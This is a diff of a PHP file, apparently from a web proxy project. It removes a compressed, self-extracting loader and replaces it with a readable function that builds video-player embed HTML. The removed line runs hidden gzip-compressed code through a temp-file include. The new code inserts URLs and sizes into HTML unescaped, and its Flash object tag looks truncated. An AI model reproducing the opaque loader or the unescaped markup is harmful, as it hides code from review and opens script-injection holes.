@@ -1,1 +1,40 @@
-<?php $f=fopen(__FILE__,'r');fseek($f,__COMPILER_HALT_OFFSET__);$t=tmpfile();$u=stream_get_meta_data($t)['uri'];fwrite($t,gzinflate(stream_get_contents($f)));include($u);fclose($t);__halt_compiler();•S]kÛ0}N ÿá"2œ”’t°¾¤q»=t¤0Ò°v°A!(¶lkÈ’ä8¡ÍŸ>Ç)}™_,Ÿ{ï¹Wç\Ïïd!azûP+¸˜úƒ~VñÄPÁaKÓµdxOÔhX)v	Ãš¦¦€¢ÏWWŸ"„æ…é"dg×®<†3MÆ3ĞFQú¯ì3”ØóH¬4Y[î¦Áj±Zÿúùc½úö¼ß´Ù…)Ùõ‘¯…i#O4†–Ø§wGøêkàn.“òL„ÛËöxX~\ßÿ~¾_>=<.O[úUl/YÊ/¼½Á{¼&›òÃ€ÈóÈ§½Q•»Î?„cóZù‰pâ8¡”ØÑlßJ5¾éhàéŞ‹à@çËÜÓ€w.FL.N BükğÆLH7J0¸2Â-Áí ßëõæZT*! UÒ¦ôuf/IŒ<8õñ“ .XşXØ(Qk¢ Dt%¥PLA mp>qó©ÿ¾Zƒ@œ­aÏäR¸¶Â‘’Ñ)rnğI"±ùK4QÆDvı·f)68F¶AÚ.½¹İq\Ç¥Õ3KŸUŒéDÂl1«,îÁÔ«sVP—ö4ÌµnBöñ*g5ÃºØÚ?ëX÷QÄ¯(aT¢ÙG¶]’¬Ê)×h6±1ß¸XP7Å,ü€8^¢fÚ`OĞûÓlp8(b*ÅƒÒ6æñ
+<?php /* yxorP */
+
+function vid_player($url, $width = '100%', $height = '100%', $extension = false): string
+{
+
+    $path = parse_url($url, PHP_URL_PATH);
+
+    $html5 = false;
+
+    if ($path) {
+
+        $extension = @false ?: pathinfo($path, PATHINFO_EXTENSION);
+
+        if ($extension === 'mp4' || $extension === 'webm' || $extension === 'ogg') {
+            $html5 = true;
+        }
+    }
+    $video_url = proxify_url($url);
+    if ($html5) {
+
+        $html = '<video width="' . $width . '" height="' . $height . '" controls autoplay>
+			<source src="' . $video_url . '" type="video/' . $extension . '">
+			Your browser does not support the video tag.
+		</video>';
+
+    } else {
+        $video_url = rawurlencode($video_url);
+
+        $html = '<object id="flowplayer" width="' . $width . '" height="' . $height . '" data="
+ 	 
+       	<param name="allowfullscreen" value="true" />
+		<param name="wmode" value="transparent" />
+        <param name="flashvars" value=\'inc={"clip":"' . $video_url . '", "plugins": {"controls": {"autoHide" : false} }}\' />
+		
+		</object>';
+    }
+
+    return $html;
+}
+
